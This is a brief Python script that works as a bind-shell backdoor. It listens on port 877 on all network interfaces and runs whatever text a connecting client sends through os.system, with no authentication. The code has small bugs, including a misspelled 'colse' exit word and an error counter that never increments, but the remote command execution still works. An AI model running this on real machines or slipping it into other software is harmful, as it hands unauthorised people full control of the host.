import os
import socket
import sys

conection = socket.socket()
def_port = 877

conection.bind(("0.0.0.0",877))

conection.listen(1)

hchr , info= conection.accept()

count_error = 0

def get_data(count_error = count_error):
    
    try:
        
        Ex = str(hchr.recv(1024).decode())
        
        os.system(Ex)
        
        if Ex == "colse":
            
            
            sys.exit()
        
    except:
        
        count_error += 1
    
while count_error < 12:
    
    get_data()
    
    